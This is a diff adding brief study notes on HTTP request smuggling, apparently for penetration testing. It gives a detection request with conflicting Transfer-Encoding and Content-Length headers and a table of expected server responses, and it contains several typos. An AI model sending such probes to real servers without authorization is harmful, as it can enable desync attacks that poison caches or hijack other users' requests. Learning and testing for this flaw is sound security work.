@@ -1,0 +1,21 @@
+HTTP Request Smuggling or HTTP DeSync attack => 
+Medhodolgy = > detect => confirm => attack
+
+How to Detect =>
+
+POST /about HTTP/1.1
+Host: example.coom
+Transfer-Encoding: chunked
+Content-Length: 9
+
+3
+abc
+T
+
+Server Responses =>
+
+Frontend:backend => what they respond
+CL:CL => backend response
+TE:TE => frontend response
+TE:CLL => fronted reponse
+CL:TE => timeout
